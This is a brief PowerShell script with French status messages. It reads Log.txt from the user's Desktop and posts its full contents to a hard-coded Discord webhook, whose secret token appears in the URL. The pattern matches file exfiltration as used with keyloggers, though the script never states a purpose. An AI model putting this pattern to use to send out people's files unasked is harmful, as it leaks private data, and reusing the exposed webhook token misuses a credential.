cd $env:userprofile\Desktop; 
$webhook="https://discord.com/api/webhooks/1244988285101801532/2gT9NpiOuMyELp5791kvlBzuGtKpDiDRzdUZYWh0VsTGUotThz44Tt8SxQzOmk2ddnHM"; 
$body = @{
    content = (Get-Content Log.txt -Raw).Replace("`r`n","\n").Replace("`t","\t")
} | ConvertTo-Json;

$response = Invoke-WebRequest -UseBasicParsing -Uri $webhook -ContentType "application/json" -Method POST -Body $body;

if ($response.StatusCode -eq 200) {
    Write-Output "Message envoyé avec succès au webhook Discord."
} else {
    Write-Error "Erreur lors de l'envoi du message au webhook Discord. StatusCode : $($response.StatusCode). ResponseBody : $($response.Content)"
}
